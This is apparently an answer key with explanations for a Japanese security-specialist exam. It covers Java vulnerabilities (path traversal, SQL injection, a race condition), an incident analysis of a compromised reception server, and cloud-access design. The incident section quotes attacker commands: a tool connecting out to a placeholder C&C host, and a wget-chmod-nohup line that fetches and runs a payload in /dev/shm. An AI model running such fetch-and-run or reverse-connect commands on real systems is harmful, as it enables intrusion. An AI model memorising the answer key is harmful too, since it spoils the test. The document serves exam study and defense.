### 解説

#### 設問1(1)　［読解］
> 本文：表1 項番2「ファイルアクセスに用いるパス名の文字列作成で，**利用者が入力したデータを直接使用**している」
> 本文：図1 13行目「File fileObj = new File(PDF_DIRECTORY + "/" + clientCode + "/" + "DeliverySlip" + **inOrderNo** + ".pdf");」
> 本文：図1 3行目「getDeliverySlipPDF(String **inOrderNo**, …)」

**考え方**：パス名を作っているのは13行目。clientCodeはDBから取った値だが，inOrderNoは画面から入力された注文番号そのもの。ここに「../」などを入れられると，ほかのディレクトリのファイルを読まれる。

**答え**：a：13

#### 設問1(2)　［読解］
> 本文：表1 項番3「変数stmt，変数resultObj，変数［ b ］が指すリソースが解放されない」
> 本文：図1 14行目「BufferedInputStream **in** = new BufferedInputStream(new FileInputStream(fileObj));」，16行目「in.read(buf);」（close していない）

**考え方**：図1で開いたまま閉じていないものは，SQL関係のstmt・resultObjのほかに，ファイルを読むストリームの in。

**答え**：b：in

#### 設問1(3)　［知識］
> 本文：図2「stmt.**setString(1, inOrderNo)**;」「ResultSet resultObj = stmt.executeQuery();」（引数なし）

**知識**：SQLインジェクション対策の基本は**プレースホルダ**（?）を使った**PreparedStatement**。SQL文の形を先に決めておき，値は setString で後から入れるので，入力値がSQL文として解釈されない。

**考え方**：setString(1, …)で1番目の?に値を入れているので，c はプレースホルダを使った条件，d は conn.prepareStatement(sql) で PreparedStatement を作る文になる。

**答え**：c：`WHERE head.order_no = ?`　d：`PreparedStatement stmt = conn.prepareStatement(sql)`

#### 設問2(1)(2)　［読解］＋［知識］
> 本文：図4 2行目「private **static** String **orderNo**;」，3〜4行目「public static void setOrderNo(…) { orderNo = inOrderNo; }」
> 本文：図5 4〜5行目「OrderInfoBL.setOrderNo(orderNo); OrderInfoBean … = OrderInfoBL.getOrderInfoBean();」
> 本文：不具合「ある得意先の利用者IDでログインして…注文番号を入力すると，**別の得意先の注文情報**が出力される」

**知識**：Javaの**static**変数はクラスに1つだけで，全てのインスタンス・全てのスレッド（リクエスト）で共有される。サーブレットは複数のリクエストを並列に処理する。

**考え方**：利用者Aが注文番号をsetした直後，getする前に，利用者Bのリクエストが同じstatic変数を書き換えると，AにはBの注文番号で検索した結果が返る。

**答え**：e：orderNo　f：static

#### 設問2(3)　［知識］
> 本文：下線①「並列動作する複数の処理が同一のリソースに同時にアクセスしたとき，想定外の処理結果が生じる」

**知識**：複数の処理が同じ資源を取り合い，実行のタイミングによって結果が変わってしまう不具合を**レースコンディション**（競合状態）という。

**答え**：レースコンディション

#### 設問2(4)　［読解］
> 本文：(1)「図4の2行目から5行目までのソースコードを**削除**する」（static変数とsetterを消す）
> 本文：図6「public OrderInfoBean getOrderInfoBean(［ g ］) {」（staticを外したインスタンスメソッド）
> 本文：図4 11行目「psObj.setString(1, **orderNo**);」

**考え方**：共有の変数をやめ，注文番号は**メソッドの引数**で渡す（g）。メソッドからstaticを外したので，サーブレット側ではリクエストごとに **new** でインスタンスを作り（h），そのメソッドに注文番号を渡して呼ぶ（i）。11行目がそのまま動くよう，引数名は orderNo にする。

**答え**：g：`String orderNo`　h：`new`　i：`getOrderInfoBean(orderNo)`

#### 設問2(5)　［読解］
> 本文：「ログイン処理時に，ログインした利用者IDと，利用者IDにひも付く**得意先コード**及び得意先名はセッションオブジェクトに保存されている」
> 本文：図3 注文ヘッダーテーブル「注文番号，注文日時，**得意先コード**，…」
> 本文：図4 10行目「WHERE head.order_no = ?」（注文番号はもう条件に入っている）

**考え方**：セッションにも注文ヘッダーテーブルにもある属性で，「自分の得意先の注文か」を確かめられるのは得意先コード。注文番号はすでに条件に入っているので答えにならない（採点講評でも注意されている）。

**答え**：j：得意先コード

## 問2 セキュリティインシデント（R社 / 受付サーバへの不正アクセス）

| 設問 | 解答 |
|---|---|
| 設問1 | a：パッシブ |
| 設問2(1) | b：コミュニティ |
| 設問2(2) | c：バインド　理由：2-3によって起動した3-3のポートへの通信が1-3で拒否されているから |
| 設問2(3) | d：コネクト　理由：2-4によって開始された3-4の通信が1-4で許可されているから |
| 設問2(4) | e：1365 |
| 設問3(1) | TXTレコードには任意の文字列を設定できるから |
| 設問3(2) | 稼働しているファイルと内容が異なる可能性があるから |
| 設問3(3) | f：受付サーバ |

### 解説

#### 設問1　［読解］＋［知識］
> 本文：表1 1-233「192.168.0.2（DBサーバ）→192.168.1.145（製造管理サーバ）　**21/TCP**　許可」，1-234「192.168.0.2→192.168.1.145　55433/TCP→**60453/TCP**　許可」

**知識**：FTPは制御用（21/TCP）とデータ用の2本の接続を使う。
- **アクティブモード**：データ接続を**サーバ側（20番）からクライアント**へ張る
- **パッシブモード**：データ接続も**クライアントからサーバ**の指定した高いポートへ張る

**考え方**：DBサーバ（クライアント）から製造管理サーバ（サーバ）の60453番という高いポートへ接続しているので，パッシブモード。

**答え**：a：パッシブ

#### 設問2(1)　［知識］
> 本文：「SNMPv2cで**public**という［ b ］名を使って，機器のバージョン情報を取得」，表1 1-232「…→192.168.1.122　**161/UDP**」

**知識**：SNMPv1/v2cは**コミュニティ名**を合言葉のように使って機器の情報を読む。“public”は初期値として使われることが多い。

**答え**：b：コミュニティ

#### 設問2(2)　［読解］
> 本文：表2 2-3「04/21 15:01　./srv -c -mode **bind** 0.0.0.0:**8080**」，表3 3-3「0.0.0.0:**8080**　LISTEN　1275」
> 本文：表1 1-3「04/21 15:03　a0.b0.c0.d0→192.168.0.1　**8080/TCP　拒否**」
> 本文：「FWでは，インターネットから受付サーバへの通信は**443/TCPだけ**を許可」

**考え方**：攻撃者はまずバインドモードで8080番を待ち受けさせ（2-3，3-3），外のC&Cサーバから接続しに来た（1-3）。しかしFWは443番しか通さないので拒否され，失敗した。

**答え**：c：バインド　理由：2-3によって起動した3-3のポートへの通信が1-3で拒否されているから

#### 設問2(3)　［読解］
> 本文：表2 2-4「04/21 15:08　./srv -c -mode **connect** a0.b0.c0.d0:**443**」，表3 3-4「192.168.0.1:**54543**→a0.b0.c0.d0:443　**ESTABLISHED**」
> 本文：表1 1-4「04/21 15:08　192.168.0.1→a0.b0.c0.d0　**54543/TCP**→443/TCP　**許可**」
> 本文：「受付サーバからインターネットへの通信はOSアップデートのために**443/TCPだけを許可**」

**考え方**：次はコネクトモードで，受付サーバから外のC&Cサーバの443番へ接続した。FWは受付サーバから外への443番を許しているので通り（1-4），接続が確立した（3-4）。送信元ポート54543が3つの表で一致する。

**答え**：d：コネクト　理由：2-4によって開始された3-4の通信が1-4で許可されているから

#### 設問2(4)　［読解］
> 本文：表2 2-5「PID **1365**　PPID **1293**　04/21 15:14　./srv **-s -range** 192.168.0.1-192.168.255.254」
> 本文：srvの特徴「C&Cサーバから指示を受け，**子プロセスを起動してポートスキャン**など行う」

**考え方**：C&Cに接続したコネクトモードのプロセス（1293）が子プロセスを起動し，IPアドレスの範囲をスキャンしている。それがPID 1365。表3 3-5でも1365が192.168.253.124の21番に接続しようとしている。

**答え**：e：1365

#### 設問3(1)　［知識］
> 本文：下線③「…**TXTレコード**のリソースデータを取得し，リソースデータの内容を**そのままコマンドとして実行**する」，図2（wget … && chmod … && nohup … のコマンド列）

**知識**：AレコードにはIPv4アドレス（4バイト）しか入らない。**TXTレコードには任意の文字列**を入れられる（SPFなどにも使われる）。

**答え**：TXTレコードには任意の文字列を設定できるから

#### 設問3(2)　［読解］
> 本文：「Webブラウザで図2のURLからlogdのファイルをダウンロードし…」，下線④「ダウンロードしたファイルは解析対象として**適切ではない**」
> 本文：「受付サーバを更に調査したところ，logdという名称の不審なプロセスが**稼働していた**」

**考え方**：URLの先のファイルは攻撃者がいつでも差し替えられる。今ダウンロードしても，受付サーバで実際に動いているlogdと同じとは限らない。調べたいのは動いているもの。

**答え**：稼働しているファイルと内容が異なる可能性があるから

#### 設問3(3)　［読解］
> 本文：図2「wget https://a0.b0.c0.d0/logd -q -O **/dev/shm/logd** …」（受付サーバ上に保存して実行）

**考え方**：実際に稼働しているlogdのファイルは受付サーバの/dev/shmにある。そこから取得する。

**答え**：f：受付サーバ

## 問3 クラウドサービス利用（Q社 / IDaaS・Pサービス）

| 設問 | 解答 |
|---|---|
| 設問1(1) | a：ア　b：イ　c：ウ |
| 設問1(2) | 送信元制限機能で，本社のUTMからのアクセスだけを許可しているから |
| 設問2(1) | d：ア　e：ウ　f：イ |
| 設問2(2) | g：イ |
| 設問3(1) | プロキシサーバではなく，Pサービスを経由させる。 |
| 設問3(2) | 送信元制限機能で，営業所のUTMのグローバルIPアドレスを設定する。 |
| 設問3(3) | （イ） |
| 設問3(4) | h：6　i：2 |
| 設問3(5) | あ：4　j：https://△△△-a.jp/　k：研究開発部の従業員　l：許可　い：3　m：外部ストレージサービス　n：全て　o：禁止 |

### 解説

#### 設問1(1)　［読解］＋［知識］
> 本文：図2「(1)サービス要求」（b→c），「(2)認証要求（リダイレクト指示）」（c→b），「(3)認証要求」（b→a），「(4)利用者の認証」（a↔b）
> 本文：「Q社のPCがSaaS-aにアクセスするときの，**SP-Initiated**方式のSAML認証」

**知識**：SAMLでは，サービスを提供する側を**SP**（ここではSaaS-a），認証する側を**IdP**（ここではLサービス）という。SP-Initiatedでは，利用者がまずSPにアクセスし，SPがブラウザをIdPへリダイレクトし，IdPで認証した結果をブラウザ経由でSPに渡す。

**考え方**：全ての矢印の中心にいるbがブラウザ。最初にアクセスされるcがSaaS-a，利用者を認証するaがLサービス。

**答え**：a：ア（Lサービス）　b：イ（PCのWebブラウザ）　c：ウ（SaaS-a）

#### 設問1(2)　［読解］
> 本文：表1 Lサービス 送信元制限機能「契約した顧客が設定したIPアドレスからのアクセスだけを許可」，注2「**本社のUTMのグローバルIPアドレス**を送信元IPアドレスとして設定している。設定しているIPアドレス以外からのアクセスは**拒否**する設定」

**考え方**：IDとパスワードを盗まれても，Lサービスには本社UTMのIPアドレスからしか入れない。社外の攻撃者のIPアドレスからは拒否される。

**答え**：送信元制限機能で，本社のUTMからのアクセスだけを許可しているから

#### 設問2(1)　［知識］
> 本文：表3 項番2「送信元からのTLS通信を**終端**し，復号してマルウェアスキャンを行う。…再暗号化して送信先に送信する。これを実現するために，［ d ］を発行する［ e ］を，［ f ］として，PCにインストールする」

**知識**：TLSを途中で復号するには，Pサービスがアクセス先になりすました**サーバ証明書**を出す必要がある。PCがそれを信頼するよう，その証明書を発行した**認証局の証明書**を，PCの**信頼されたルート証明書**として入れておく。

**答え**：d：ア（Pサービスのサーバ証明書）　e：ウ（認証局の証明書）　f：イ（信頼されたルート証明書）

#### 設問2(2)　［知識］
> 本文：表3 項番5「中継する通信のログを基に，**クラウドサービスの利用状況の可視化**を行う」

**知識**：**CASB**（Cloud Access Security Broker）は，利用者とクラウドサービスの間に入り，利用状況の可視化，アクセス制御，データ保護などを行う仕組み。CAPTCHAは人間判定，CHAPは認証プロトコル，CVSSは脆弱性の評価基準。

**答え**：g：イ（CASB）

#### 設問3(1)　［読解］
> 本文：「PCのWebブラウザからインターネットへのアクセスは，**本社のプロキシサーバ**を経由する」，表1 注4「本社のUTMと各営業所のUTMとの間でVPN通信」
> 本文：表2 要件1「**本社のインターネット回線をひっ迫させない**」
> 本文：図3 営業所にPコネクタを追加

**考え方**：今は営業所のPCも，VPNで本社に入り，本社のプロキシサーバから外に出ている。本社の回線を使わないように，営業所から直接Pサービスを経由してインターネットに出るように変える。

**答え**：プロキシサーバではなく，Pサービスを経由させる。

#### 設問3(2)　［読解］
> 本文：表3 項番1「Lサービスの送信元制限機能には，**Pサービスに接続してきた送信元のIPアドレスが通知**される」
> 本文：表1 注2「本社のUTMのグローバルIPアドレスを送信元IPアドレスとして設定」

**考え方**：営業所からPサービス経由でLサービスを使うと，通知される送信元は営業所UTMのグローバルIPアドレスになる。今は本社のIPアドレスしか登録していないので，これを追加する。

**答え**：送信元制限機能で，営業所のUTMのグローバルIPアドレスを設定する。

#### 設問3(3)　［読解］＋［知識］
> 本文：表2 要件2「Lサービスに接続できる**PC**を，本社と営業所のPC及びR-PCに制限する。なお，**従業員宅のネットワークについて，前提を置かない**」
> 本文：表1 多要素認証「（ア）スマートフォンにSMSでワンタイムパスワード」「（イ）**TLSクライアント認証**」

**考え方**：自宅のIPアドレスは決まらないので送信元制限は使えない。接続できる「PC」を制限するには，R-PCにクライアント証明書を入れて機器を認証する（イ）が合う。（ア）のSMSは人を確かめるだけで，どのPCからでも使えてしまう。

**答え**：（イ）

#### 設問3(4)　［読解］
> 本文：表2 要件3「R-PCから本社のサーバにアクセス…ただし，UTMのファイアウォール機能には，**インターネットからの通信を許可するルールを追加しない**」，要件4「**HTTPS通信の内容をマルウェアスキャン**する」
> 本文：表3 項番6 リモートアクセス機能「Pコネクタを社内に導入…**ファイアウォールの設定を変更せず**に社外から社内にアクセス」，注2「PコネクタからPサービスに接続を開始する」，項番2 マルウェアスキャン機能

**答え**：h：6　i：2

#### 設問3(5)　［読解］
> 本文：表2 要件5「SaaS-a以外の外部ストレージサービスへのアクセスは**禁止**…SaaS-aへのアクセスは業務で必要な**最小限の利用者**に限定」
> 本文：図1 注記「SaaS-aは，**研究開発部の従業員**が使用する」，注1「URLは，https://△△△-a.jp/ から始まる」
> 本文：表3 項番3（URLカテゴリ単位，カテゴリに「外部ストレージサービス」），項番4（URL単位），表5 注記「番号の**小さい順に最初に一致したルール**が適用される」

**考え方**：SaaS-aも外部ストレージサービスのカテゴリに入る。先に「全員・外部ストレージ禁止」を置くと研究開発部もSaaS-aを使えなくなるので，順番が大事。
- 番号1：URL単位（項番4）で，研究開発部の従業員に https://△△△-a.jp/ を**許可**
- 番号2：URLカテゴリ単位（項番3）で，全ての利用者に外部ストレージサービスを**禁止**

**答え**：あ：4　j：https://△△△-a.jp/　k：研究開発部の従業員　l：許可　い：3　m：外部ストレージサービス　n：全て　o：禁止
